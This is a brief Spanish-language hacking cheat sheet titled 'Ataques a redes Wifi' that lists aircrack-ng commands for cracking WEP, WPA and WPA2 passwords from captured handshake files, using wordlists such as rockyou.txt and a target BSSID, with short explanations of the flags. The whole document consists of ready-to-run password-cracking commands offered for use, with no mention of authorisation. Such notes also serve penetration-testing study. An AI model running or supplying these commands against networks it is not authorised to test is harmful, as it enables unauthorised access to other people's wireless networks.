# Ataques a redes Wifi 

Tags: #Hacking #Wifi #Ñ 

## WEP

```bash 
# Kali Tool
❯ aircrack-ng 'WEPcrack-01.cap'      # Archivo con el 'Handshake' para obtener la passwd 
```

## WPA

```bash 
# Kali Tool
❯ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b BSSID pass.cap
```

## WPA2

```bash 
# Kali Tool
❯ aircrack-ng WPA2crack-01.cap -w password.txt 
❯ aircrack-ng -a2 -b BSSID -w /home/kali/Desktop/Wordlist/password.txt 'WPA2crack-01.cap'

	# a = Es la técnica '2=WPA'
	# b = BSSID es la MAC Address del AP
	# w = Diccionario de contraseñas 
```